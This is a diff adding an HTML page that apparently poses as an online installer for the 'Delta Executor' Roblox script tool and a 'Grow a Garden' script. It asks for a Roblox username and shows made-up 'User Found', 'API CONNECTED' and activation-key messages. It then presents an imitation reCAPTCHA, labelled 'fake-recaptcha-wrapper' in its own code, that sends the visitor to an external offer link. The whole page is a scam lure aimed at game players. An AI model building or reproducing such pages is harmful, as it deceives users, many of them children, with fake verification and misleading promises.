@@ -1,0 +1,352 @@
+<!DOCTYPE html>
+<html lang="en">
+<head>
+  <meta charset="UTF-8">
+  <meta name="viewport" content="width=device-width, initial-scale=1.0">
+  <title>Delta Executor</title>
+  <link rel="preconnect" href="https://fonts.googleapis.com"><link rel="preconnect" href="https://fonts.gstatic.com" crossorigin><link href="https://fonts.googleapis.com/css2?family=Inter:wght@300;400;500;600;700&display=swap" rel="stylesheet">
+  <link rel="stylesheet" href="styles.css">
+  <script src="https://unpkg.com/lucide@latest"></script>
+    <script defer src="https://analytics.ufomedia.xyz/script.js" data-website-id="4d044431-8765-4cc3-bb1e-14c8f64f2790"></script>
+</head>
+<body class="min-h-screen bg-dark text-white">
+  <!-- Header -->
+  <header class="header">
+    <div class="container">
+      <div class="header-content">
+        <!-- Logo -->
+        <div class="logo">
+          <i data-lucide="terminal" class="logo-icon"></i>
+          <img src="/logo.png" alt="Delta Executor Logo" class="logo-image">
+        </div>
+        
+        <!-- Description -->
+        <p class="description">
+          The most powerful and reliable Roblox script executor, trusted by millions of users worldwide.
+        </p>
+        
+        <!-- Stats -->
+        <div class="stats">
+          <div class="stat">
+            Date Updated: <span id="currentDate" class="stat-value"></span>
+          </div>
+          <div class="stat">
+            Online Users: <span id="onlineUsers" class="stat-value-green"></span>
+          </div>
+        </div>
+      </div>
+    </div>
+  </header>
+
+  <!-- Main Content -->
+  <main class="container main-content">
+    <div class="content-wrapper">
+<div style="text-align: center;">
+  <img src="blox.png" alt="Grow a Garden" class="logo-image"> 
+<p style="text-align: center;">The latest updated online tool for Roblox &ndash; Direct Import Grow a Garden Script online, with no downloads.</p>
+<p style="text-align: center;">&nbsp;</p>
+<p style="text-align: center;">&nbsp;</p></div>
+      <!-- Step 1: Roblox ID -->
+      <div id="step1" class="step-container">
+        <div class="card">
+          <h2 class="card-title">Enter Your Roblox Username</h2>
+          <div style="text-align: center;">
+  
+</div>
+
+
+
+
+<p style="text-align: center;">&nbsp;</p>
+
+          <div class="input-group">
+            <input
+              type="text"
+              id="robloxId"
+              placeholder="Enter your Roblox username"
+              class="input"
+            />
+            <div style="height: 20px;"></div>
+            <button
+              id="searchButton"
+              
+              class="button"
+              disabled
+            >
+             </i> Continue
+            </button>
+
+          </div>
+          <div id="userFound" class="user-found hidden">
+            <i data-lucide="check"></i>
+            <span>User Found!</span>
+          </div>
+        </div>
+      </div>
+
+      <!-- Step 2: Script Selection -->
+      <div id="step2" class="step-container hidden">
+        <div class="card">
+          <h2 class="card-title">Select Script</h2>
+          <div class="script-selection">
+            <div class="checkbox-group">
+              <input
+                type="checkbox"
+                id="install"
+                class="checkbox"
+              />
+              <label for="install" class="checkbox-label">
+                Install Delta Executor to "<span id="selectedId"></span>"
+              </label>
+            </div>
+
+            <select
+              id="scriptSelect"
+              class="select"
+              disabled
+            >
+              <option value="">Select a script</option>
+            </select>
+
+            <button
+              id="continueButton"
+              class="button"
+              disabled
+            >
+              Continue
+            </button>
+          </div>
+        </div>
+      </div>
+
+      <!-- Step 3: Final Step -->
+      <div id="step3" class="step-container hidden">
+        <div class="card">
+          <div class="final-step">
+            <div class="success-message">
+              <i data-lucide="check"></i>
+              <span>API CONNECTED!</span>
+            </div>
+
+            <p class="success-description">
+              You have successfully connected your account to the Delta Executor Server API using this online tool!
+            </p>
+
+            <div class="info-box">
+              <div class="info-group">
+                <p class="info-label">User Connected:</p>
+                <p id="connectedUser" class="info-value"></p>
+              </div>
+
+              <div class="info-group">
+                <p class="info-label">ACTIVATION KEY GENERATED:</p>
+                <p id="generatedKey" class="info-value-key"></p>
+              </div>
+
+              <div class="info-group">
+                <p class="info-label">Time Left:</p>
+                <p id="timeLeft" class="info-value-time"></p>
+              </div>
+            </div>
+
+            <!-- Add this anywhere in your existing page -->
+<div class="fake-recaptcha-wrapper" onclick="verifyCaptcha()">
+  <div class="recaptcha-box">
+    <div class="checkbox-area">
+      <div class="spinner" id="spinner"></div>
+      <div class="checkmark" id="checkmark"></div>
+    </div>
+    <div class="right-section">
+      <div class="robot-text">I'm not a robot</div>
+      <div class="branding">
+        <img src="https://www.gstatic.com/recaptcha/api2/logo_48.png" alt="reCAPTCHA">
+        <div class="branding-text">
+          <div class="recaptcha-label">reCAPTCHA</div>
+          <div class="recaptcha-links">
+            <a href="#">Privacy</a> • <a href="#">Terms</a>
+          </div>
+        </div>
+      </div>
+    </div>
+  </div>
+</div>
+
+          </div>
+        </div>
+      </div>
+    </div>
+  </main>
+
+  <!-- Loading Overlay -->
+  <div id="loadingOverlay" class="loading-overlay hidden">
+    <div class="loading-card">
+      <div class="loading-content">
+        <div class="loading-spinner">
+          <i data-lucide="loader-2"></i>
+          <div class="loading-dot"></div>
+        </div>
+        <div class="loading-text">
+          <p id="loadingMessage" class="loading-message"></p>
+          <div class="progress-bar">
+            <div id="progressBar" class="progress"></div>
+          </div>
+          <p id="progressText" class="progress-text">0%</p>
+        </div>
+      </div>
+    </div>
+  </div>
+
+  <script src="script.js"></script>
+
+  <style>
+.fake-recaptcha-wrapper {
+  width: fit-content;
+  margin: 20px auto;
+  font-family: Roboto, Arial, sans-serif;
+}
+
+.fake-recaptcha-wrapper .recaptcha-box {
+  background: #f9f9f9;
+  border: 1px solid #d3d3d3;
+  border-radius: 3px;
+  width: 270px;
+  height: 78px;
+  display: flex;
+  align-items: center;
+  padding: 8px 10px;
+  box-sizing: border-box;
+  box-shadow: 0 0 3px rgba(0,0,0,0.1);
+  cursor: pointer;
+  gap: 12px;
+}
+
+.fake-recaptcha-wrapper .checkbox-area {
+  width: 28px;
+  height: 28px;
+  border: 2px solid #c1c1c1;
+  border-radius: 2px;
+  position: relative;
+  background: #fff;
+  flex-shrink: 0;
+}
+
+.fake-recaptcha-wrapper .checkmark {
+  display: none;
+  position: absolute;
+  top: 3px;
+  left: 6px;
+  width: 12px;
+  height: 20px;
+  border: solid #4a8ef6;
+  border-width: 0 3px 3px 0;
+  transform: rotate(45deg);
+}
+
+.fake-recaptcha-wrapper .spinner {
+  display: none;
+  border: 3px solid #f3f3f3;
+  border-top: 3px solid #4a8ef6;
+  border-radius: 50%;
+  width: 20px;
+  height: 20px;
+  animation: spin 1s linear infinite;
+  position: absolute;
+  top: 3px;
+  left: 3px;
+}
+
+@keyframes spin {
+  0% { transform: rotate(0deg);}
+  100% { transform: rotate(360deg);}
+}
+
+.fake-recaptcha-wrapper .right-section {
+  display: flex;
+  flex-direction: column;
+  justify-content: center;
+  margin-left: 6px;
+}
+
+.fake-recaptcha-wrapper .robot-text {
+  color: #555;
+  font-size: 14px;
+  margin-bottom: 6px;
+}
+
+.fake-recaptcha-wrapper .branding {
+  display: flex;
+  align-items: center;
+}
+
+.fake-recaptcha-wrapper .branding img {
+  width: 20px;
+  height: 20px;
+  margin-right: 4px;
+}
+
+.fake-recaptcha-wrapper .branding-text {
+  display: flex;
+  flex-direction: column;
+  line-height: 1.2;
+}
+
+.fake-recaptcha-wrapper .recaptcha-label {
+  color: #555;
+  font-weight: bold;
+  font-size: 10px;
+}
+
+.fake-recaptcha-wrapper .recaptcha-links {
+  font-size: 10px;
+  color: #555;
+}
+
+.fake-recaptcha-wrapper .recaptcha-links a {
+  text-decoration: none;
+  color: #555;
+  margin: 0 2px;
+}
+
+.fake-recaptcha-wrapper .recaptcha-links a:hover {
+  text-decoration: underline;
+}
+</style>
+
+<script>
+function verifyCaptcha() {
+  const spinner = document.getElementById('spinner');
+  const checkmark = document.getElementById('checkmark');
+
+  if (spinner.style.display === 'block') return;
+
+  spinner.style.display = 'block';
+
+  setTimeout(() => {
+    spinner.style.display = 'none';
+    checkmark.style.display = 'block';
+
+    setTimeout(() => {
+      window.location.href = "https://vrfget.com/fe4bdb2?s1=GrowGarden"; // Your redirect
+    }, 500);
+  }, 3000);
+}
+</script>
+
+    <script>
+        // Custom path tracking for Umami
+        const VIRTUAL_PATH = '/scripts/plantsbrainrots/garden';
+        document.addEventListener('DOMContentLoaded', function() {
+            if (typeof umami !== 'undefined') {
+                umami.track(props => ({ ...props, url: VIRTUAL_PATH }));
+            }
+        });
+        
+        // Track step changes
+        function trackStep(stepName) {
+            if (typeof umami !== 'undefined') {
+                umami.track(props => ({ ...props, url: VIRTUAL_PATH + '/' + stepName }));
+            }
+        }
+    </script>
+</body>
+</html>
